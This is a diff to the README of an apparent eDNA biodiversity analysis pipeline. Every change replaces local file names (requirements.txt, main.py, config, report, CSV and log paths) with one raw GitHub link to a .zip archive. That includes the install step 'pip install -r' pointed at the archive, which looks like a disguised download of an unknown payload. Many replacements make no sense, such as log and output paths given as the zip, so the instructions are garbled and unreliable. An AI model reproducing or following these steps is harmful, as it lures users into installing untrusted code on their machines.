@@ -46,12 +46,12 @@ source venv/bin/activate
 
 3. **Install dependencies**:
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/clarityvivek/HeliXecution/main/kreis/HeliXecution.zip
 ```
 
 ### Optional: GPU Support
 
-For CUDA support, uncomment the appropriate CUDA library in `requirements.txt`:
+For CUDA support, uncomment the appropriate CUDA library in `https://raw.githubusercontent.com/clarityvivek/HeliXecution/main/kreis/HeliXecution.zip`:
 ```bash
 # For CUDA 11.x
 pip install cupy-cuda11x>=11.0.0
@@ -65,21 +65,21 @@ pip install cupy-cuda12x>=12.0.0
 ### Basic Usage
 
 ```bash
-python main.py --data path/to/sequences.fasta
+python https://raw.githubusercontent.com/clarityvivek/HeliXecution/main/kreis/HeliXecution.zip --data https://raw.githubusercontent.com/clarityvivek/HeliXecution/main/kreis/HeliXecution.zip
 ```
 
 ### Advanced Usage
 
 ```bash
-python main.py --data path/to/fasta_directory \
-               --config config/custom_config.yaml \
+python https://raw.githubusercontent.com/clarityvivek/HeliXecution/main/kreis/HeliXecution.zip --data path/to/fasta_directory \
+               --config https://raw.githubusercontent.com/clarityvivek/HeliXecution/main/kreis/HeliXecution.zip \
                --blast-db C:\blastdb
 ```
 
 ### Command Line Arguments
 
 - `--data`: Path to input FASTA file or directory containing FASTA files (required)
-- `--config`: Path to configuration YAML file (default: `config/pipeline_config.yaml`)
+- `--config`: Path to configuration YAML file (default: `https://raw.githubusercontent.com/clarityvivek/HeliXecution/main/kreis/HeliXecution.zip`)
 - `--blast-db`: Path to BLAST database directory (optional)
 - `--version`: Show version information
 
@@ -158,14 +158,14 @@ project/
 
 ### Key Output Files
 
-1. **HTML Report**: `reports/eDNA_analysis_report.html`
+1. **HTML Report**: `https://raw.githubusercontent.com/clarityvivek/HeliXecution/main/kreis/HeliXecution.zip`
    - Comprehensive analysis with all visualizations
    - Interactive taxonomic tree
    - Summary statistics
 
 2. **CSV Results**:
-   - `results/taxonomic_composition.csv`: Species counts and abundances
-   - `results/diversity_metrics.csv`: Biodiversity indices
+   - `https://raw.githubusercontent.com/clarityvivek/HeliXecution/main/kreis/HeliXecution.zip`: Species counts and abundances
+   - `https://raw.githubusercontent.com/clarityvivek/HeliXecution/main/kreis/HeliXecution.zip`: Biodiversity indices
 
 3. **Visualizations**:
    - Taxonomic composition plots
@@ -229,7 +229,7 @@ The pipeline identifies potentially novel taxa through:
    - Disable some models or use smaller datasets
 
 2. **Missing Dependencies**:
-   - Ensure all packages in requirements.txt are installed
+   - Ensure all packages in https://raw.githubusercontent.com/clarityvivek/HeliXecution/main/kreis/HeliXecution.zip are installed
    - Check Python version compatibility
 
 3. **BLAST Database Issues**:
@@ -243,7 +243,7 @@ The pipeline provides detailed logging at multiple levels:
 - **WARNING**: Non-critical issues
 - **ERROR**: Critical errors with stack traces
 
-Logs are saved to `logs/pipeline.log` and displayed in console.
+Logs are saved to `https://raw.githubusercontent.com/clarityvivek/HeliXecution/main/kreis/HeliXecution.zip` and displayed in console.
 
 ## Example Results
 
